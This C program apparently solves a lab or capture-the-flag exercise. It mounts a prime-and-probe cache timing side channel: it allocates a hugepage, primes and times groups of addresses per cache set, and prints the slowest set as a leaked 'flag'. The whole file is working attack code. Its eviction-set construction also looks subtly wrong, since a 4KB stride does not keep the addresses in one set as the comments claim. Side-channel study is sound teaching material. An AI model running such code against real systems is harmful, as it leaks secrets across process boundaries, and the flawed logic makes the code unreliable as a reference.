#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define BUFF_SIZE (1<<21) // 2MB
#define NUM_SETS 1024     // 2MB hugepage = 1024 cache sets
#define STRIDE (1<<12)    // 4KB stride (different page offset)
#define ADDRS_PER_SET 8   // Number of addresses per set

int main(int argc, char const *argv[]) {
    int flag = -1;

    // Allocate hugepage memory
    uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB,
                        -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap() failed");
        exit(1);
    }

    uint64_t best_time = 0;
    int best_set = -1;

    for (int set_index = 0; set_index < NUM_SETS; set_index++) {
        uint64_t total_time = 0;

        // Collect multiple addresses mapping to this set
        for (int a = 0; a < ADDRS_PER_SET; a++) {
            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);

            // Prime - access all addresses
            *addr;
        }

        // Wait a little
        for (volatile int i = 0; i < 10000; i++);

        // Measure access times
        for (int a = 0; a < ADDRS_PER_SET; a++) {
            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);

            for (int repeat = 0; repeat < 5; repeat++) {
                total_time += measure_one_block_access_time((uint64_t)addr);
            }
        }

        // Compare total access time
        if (total_time > best_time) {
            best_time = total_time;
            best_set = set_index;
        }
    }

    flag = best_set;

    printf("Flag: %d\n", flag);

    return 0;
}